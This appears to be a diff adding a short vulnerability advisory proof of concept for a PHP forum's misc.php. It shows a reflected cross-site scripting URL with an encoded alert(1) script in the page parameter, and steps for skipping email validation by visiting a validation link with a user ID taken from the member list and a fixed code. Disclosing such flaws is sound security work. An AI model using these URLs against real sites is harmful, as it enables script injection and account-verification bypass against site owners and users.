@@ -1,0 +1,6 @@
+http://www.example.com/misc.php?sub=memberlist&amp;page=-111111111111111111%3Cscript%3Ealert(1)%3C/script%3E
+
+After the user registration procedure, Simply enter to the link:
+http://www.example.com/misc.php?sub=valemail&amp;valmem=[USER_ID]&amp;valnum=cp77fk4r
+you can get your [USER_ID] on the last page of Member-List section:
+http://www.example.com/misc.php?sub=memberlist&amp;page=[LAST_PAGE]
